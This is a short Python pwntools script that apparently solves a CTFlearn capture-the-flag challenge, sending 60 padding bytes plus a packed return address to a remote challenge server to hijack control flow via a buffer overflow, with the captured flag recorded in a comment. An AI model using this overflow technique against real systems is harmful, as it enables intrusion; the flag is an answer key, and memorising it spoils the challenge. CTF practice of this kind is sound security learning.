from pwn import *

secret = p32(0x08048586)

padding = b"\x41"*60

p = remote("thekidofarcrania.com", 4902)

p.recv()
p.sendline(padding+secret)
p.interactive()

#FLAG: CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
